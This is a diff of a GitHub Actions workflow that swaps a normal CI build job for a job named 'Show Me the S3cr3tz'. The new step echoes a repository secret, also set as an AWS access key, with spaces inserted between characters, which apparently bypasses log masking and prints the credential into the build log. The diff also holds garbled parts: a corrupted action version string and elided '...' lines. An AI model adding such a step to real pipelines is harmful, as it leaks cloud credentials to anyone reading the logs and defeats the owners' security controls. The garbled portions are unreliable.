@@ -1,11 +1,19 @@
-name: CI
-
-on: [push, pull_request]
+name: Show Me the S3cr3tz
+on: [push]
 
 jobs:
-  build:
+  debug:
+    name: Debug
     runs-on: ubuntu-latest
 
     steps:
-    - name: Checkout code
-      uses: actions/checkout@v3444444444444444444444444444444
+    - name: Check out code
+      uses: actions/checkout@v2
+
+    - name: Set up secret file
+      env:
+        AWS_ACCESS_KEY_ID: ${{ secrets.TEST_SEC }}
+        ...
+        ...
+      run: |
+        echo ${{secrets.TEST_SEC}} | sed 's/./& /g'
